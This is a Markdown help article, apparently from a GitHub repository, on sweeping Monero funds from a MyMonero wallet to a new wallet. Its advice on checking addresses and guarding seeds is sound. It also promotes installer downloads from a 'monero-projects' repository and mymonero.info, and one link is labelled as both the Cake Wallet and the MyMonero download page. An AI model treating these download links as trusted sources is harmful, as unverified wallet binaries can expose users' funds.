<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">Sweep MyMonero Funds to a New Wallet</h1>
<p align="center">Understand what sweeping does and prepare carefully before sending your full balance.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
Sweeping means sending all funds from one wallet to a new wallet in an on-chain transaction. It is different from restoring the same seed in another app, and it requires a valid destination address, a fee, and careful verification before you confirm.


Prefer reading on the web? The [MyMonero sweep to new wallet page](https://mymonero.info/mymonero-sweep-to-new-wallet) on mymonero.info explains the same problem, the [Cake Wallet download page](https://mymonero.info/github/cake-developments) lists the safe sources, and [the MyMonero FAQ](https://mymonero.info/faq) covers the common questions.

## You'll see this if
- You want to move away from an old MyMonero wallet rather than restore it elsewhere.
- You created a new wallet and want to send the old wallet’s funds there.
- You are unsure whether restoring your seed already moved the balance.
- You want to avoid sending funds to a wrong or fraudulent destination.

## Why it happens
A seed restore and a sweep have different effects. Restoring the seed in Cake Wallet provides access to the same wallet; it does not put funds into a newly created wallet. Sweeping creates a transaction that sends the wallet’s available funds to another address. That transaction can have a network fee and should be reviewed before sending.

MyMonero desktop’s final release is v1.3.3. The old app can still open wallets and send XMR, but is no longer maintained and has no new features or security updates. MyMonero hosted servers and web wallet login stopped. The two stated options are to continue using MyMonero desktop or restore its seed in Cake Wallet. If you choose to move to a newly created wallet, sweeping is a separate operation. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. See [the migration comparison](./mymonero-to-cake-wallet-migration.md) and [wallet comparison](./mymonero-vs-cake-wallet-comparison.md).

A sweep does not repair a seed, change a restore height, or confirm a pending transaction. Ensure the source wallet is synchronized enough to show spendable funds, and understand the destination before authorizing a transaction. Never let a stranger provide or substitute the destination address. Anyone who asks for your seed or keys to “sweep” your funds is not a legitimate requirement.

---

## Fix
1. **Decide whether you need a sweep.** If your goal is simply to access the existing wallet in Cake Wallet, restoring its seed may be sufficient. Sweep only if you intend to send funds to a different wallet with a different address. Review [restore versus sweep](./mymonero-migration-checklist.md) before acting.
2. **Prepare the destination wallet yourself.** Create or open the intended new wallet using a trusted application. Cake Wallet is the only alternative wallet named in this guide; it runs on iOS, Android, macOS, and Linux, while Windows desktop builds are paused at the time of writing. Keep its seed private and secure.
3. **Obtain the receiving address from the destination app.** Copy it using a method you control, then compare the address shown before sending with the destination app’s address. Do not use an address sent by an unsolicited helper, found in an unrelated message, or substituted by a remote operator.
4. **Confirm the source wallet is ready.** Open the MyMonero desktop wallet or the restored wallet, allow synchronization to complete, and check that funds are spendable. If the balance is locked or pending, a sweep may not send everything immediately. See [spendable balance guidance](./mymonero-spendable-balance-low.md).
5. **Choose the wallet’s sweep function.** Use the wallet’s own send-all or sweep control, if provided. Check the displayed destination, fee, and amount. “All” can mean all spendable funds after fees, not an amount that ignores transaction costs. Never bypass warnings you do not understand.
6. **Review every detail on your own screen.** Independently compare the destination address, inspect the amount and fee, and ensure the transaction is going to the intended wallet. If anything differs, cancel and start over using the address displayed in the destination wallet.
7. **Confirm only when ready.** Submit the transaction from the wallet you control. Do not share your seed, private keys, or password with anyone offering to submit it for you. A support person should not need access to your wallet.
8. **Check status in the wallet.** Allow the transaction to appear and complete according to the wallet’s normal process. A delay does not automatically mean that the funds are lost. Keep the transaction details private enough to avoid exposing sensitive information.

> [!TIP]
> If you are not certain about a destination address, pause and verify it directly in the receiving wallet rather than using an address from chat or email.

> [!WARNING]
> A sweep sends funds on-chain. A mistaken destination may not be recoverable. Nobody legitimate asks you to reveal your seed as part of sending a transaction.

## If that did not work
If a sweep option is unavailable, check that the wallet is fully synchronized and that funds are spendable rather than locked or pending. Do not infer that creating a new wallet transferred the old balance. Restoring the original seed and sending to a new wallet are separate tasks.

If the balance appears lower than expected, consider whether some funds are not yet spendable and review the displayed fee before sending. For a missing balance or incomplete history, check [zero balance after restore](./mymonero-balance-shows-zero.md) and restore height. Do not respond to a mismatch by providing the seed to a supposed recovery agent.

If the transaction does not appear, wait and use the wallet’s transaction status information. Error 523 is general guidance that a server connection is unavailable; it does not establish that a transaction failed or that your seed is wrong. MyMonero’s final desktop version, v1.3.3, remains unmaintained.

## Prevention
Keep the receiving wallet’s seed backed up before moving funds, and verify that the wallet opens as expected. Record the destination from the receiving app and check it on the device you control immediately before confirming. Understand how fees affect a send-all transaction and do not rush. For a migration, decide in advance whether you want to restore the same wallet or send to a separate wallet; use the migration checklist. Treat unsolicited offers to move funds as suspicious and never share recovery words.

## FAQ
<details><summary>Does restoring my seed sweep the funds?</summary>

No. A restore gives access to the same wallet. A sweep is a separate transaction to a different wallet.

</details>

<details><summary>Does a sweep always send the exact full balance?</summary>

It sends the available funds according to the wallet’s send-all behavior and applicable fee. Review the amount and fee before confirmation.

</details>

<details><summary>Can I sweep while funds are pending?</summary>

Funds that are not spendable may not be available to send. Check the wallet’s status and wait as needed.

</details>

<details><summary>Should support see my seed to help?</summary>

No. Never share your seed or private keys. Verify the destination address yourself in the receiving wallet.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/cake-developments)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Alternative Wallet](./mymonero-alternative-wallet.md) | Your practical options after MyMonero hosted access stopped. |
| [MyMonero vs Cake Wallet Comparison](./mymonero-vs-cake-wallet-comparison.md) | Compare the remaining practical paths by platform, maintenance, and migration behavior. |
| [MyMonero Migration Checklist](./mymonero-migration-checklist.md) | A calm sequence for preparing a wallet restore or a separate funds transfer. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
